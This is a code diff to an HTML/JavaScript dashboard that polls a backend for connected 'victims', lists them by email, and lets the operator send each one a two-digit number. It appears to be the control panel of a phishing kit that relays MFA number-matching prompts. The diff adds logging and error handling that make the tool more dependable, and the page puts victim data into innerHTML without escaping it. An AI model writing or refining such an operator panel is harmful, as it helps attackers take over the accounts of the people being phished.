@@ -26,7 +26,8 @@
       fetch(`${SCRIPT_URL}?getVictims=true`)
         .then(r => r.json())
         .then(victims => {
-          document.getElementById("victims-container").innerHTML = victims.length === 0 
+          console.log("Dashboard received victims:", victims); // Debug log
+          document.getElementById("victims-container").innerHTML = victims.length === 0
             ? "<p>No victims connected yet.</p>"
             : victims.map(v => `
               <div class="victim-card">
@@ -37,12 +38,15 @@
                 <button onclick="set('${v.email}')">Set</button>
               </div>
             `).join('');
-        });
+        })
+        .catch(err => console.error("Dashboard fetch failed:", err));
     }
 
     function set(email) {
       const val = document.getElementById(`n-${email}`).value.trim();
-      if (!/^\d{2}$/.test(val)) return alert("2 digits please");
+      if (!/^\d{2}$/.test(val)) return alert("Enter 2 digits (10-99)");
+      
+      console.log("Setting number for", email, "to", val);
 
       fetch(SCRIPT_URL, {
         method: "POST",
@@ -51,13 +55,16 @@
       })
       .then(r => r.json())
       .then(d => {
-        if (d.success) alert("Sent!");
+        console.log("Set number response:", d);
+        if (d.success) alert("Number sent!");
+        else alert("Failed: " + (d.error || "Unknown"));
         refresh();
-      });
+      })
+      .catch(err => console.error("Set number failed:", err));
     }
 
     setInterval(refresh, 5000);
-    refresh();
+    refresh(); // Initial load
   </script>
 </body>
 </html>
